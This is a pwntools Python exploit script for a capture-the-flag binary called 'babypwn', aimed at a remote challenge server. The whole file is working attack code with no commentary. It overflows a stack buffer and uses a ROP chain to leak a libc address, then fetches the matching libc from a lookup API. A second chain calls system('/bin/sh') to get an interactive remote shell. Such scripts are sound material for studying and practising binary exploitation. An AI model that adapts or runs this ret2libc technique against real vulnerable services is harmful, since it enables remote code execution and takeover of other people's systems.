#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./babypwn')
context.log_level = 'INFO'
context.log_file = 'remote.log'
libc_index = 0
offset = 0x78

if binary.pie:
	# need leak or assume no ASLR
	binary.address = 0x0000555555554000

while True:
	p = remote('chal.cybersecurityrumble.de', 1990)

	rop = ROP([binary])
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

	payload  = 2 * b'A'
	payload += (offset - len(payload)) * b'\0'
	payload += p64(pop_rdi)
	payload += p64(binary.got.puts)
	payload += p64(binary.plt.puts)
	payload += p64(binary.sym.main)

	p.sendlineafter('return.\n',payload)
	_ = p.recv(6)
	puts = u64(_ + b'\0\0')
	log.info('puts: ' + hex(puts))

	import requests
	r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
	while True:
		libc_url = r.json()[libc_index]['download_url']
		if context.arch in libc_url:
			break
		libc_index += 1
	log.info('libc_url: ' + libc_url)
	libc_file = libc_url.split('/')[-1:][0]
	if not os.path.exists(libc_file):
		log.info('getting: ' + libc_url)
		r = requests.get(libc_url, allow_redirects=True)
		open(libc_file,'wb').write(r.content)

	libc = ELF(libc_file)
	libc.address = puts - libc.sym.puts
	log.info('libc.address: ' + hex(libc.address))

	payload  = 2 * b'A'
	payload += (offset - len(payload)) * b'\0'
	payload += p64(pop_rdi + 1)
	payload += p64(pop_rdi)
	payload += p64(libc.search(b'/bin/sh').__next__())
	payload += p64(libc.sym.system)

	p.sendlineafter('return.\n',payload)

	try:
		p.sendline('echo shell')
		if b'shell' in p.recvline():
			p.interactive()
			break
	except:
		libc_index += 1
		p.close()
